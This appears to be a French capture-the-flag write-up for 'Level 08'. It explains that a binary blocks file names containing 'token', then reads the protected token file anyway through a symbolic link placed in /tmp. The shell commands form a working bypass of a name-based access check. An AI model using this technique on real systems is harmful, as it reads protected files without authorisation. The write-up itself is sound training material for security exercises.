## Level 08

### Analyse
Le binaire level08 prend un fichier en argument mais refuse de l'ouvrir si le nom contient la chaîne "token":

```bash
$ ./level08 token
You may not access 'token'
```
La protection vérifie la chaîne de caractères du chemin (le nom) et non l'identité réelle du fichier sur le disque.

### Exploitation
On crée un alias (lien symbolique) vers le fichier cible avec un nom autorisé :

```bash
$ ln -s /home/user/level08/token /tmp/anything
./level08 /tmp/anything
```
